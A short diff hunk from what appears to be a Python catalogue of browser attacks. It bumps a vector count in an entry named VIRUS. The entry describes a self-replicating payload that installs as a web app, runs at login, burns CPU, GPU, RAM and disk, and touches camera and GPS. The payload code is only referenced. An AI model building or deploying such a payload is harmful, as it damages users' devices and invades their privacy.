@@ -1356,7 +1356,7 @@ VIRUS: Dict[str, Any] = {
     "description_en": "Apex resident weapon: installs as a PWA, auto-runs at OS login, and exhausts CPU/GPU/RAM/disk while freezing the main thread.",
     "tags": ["apex", "resident", "pwa", "install", "self-replicating", "persistent",
              "cpu-burn", "gpu-burn", "ram-balloon", "disk-fill", "freeze", "camera", "gps"],
-    "vectors": 15,
+    "vectors": 16,
     "signals": 140,
     "requires_https": True,
     "payload": PAYLOAD_JS,
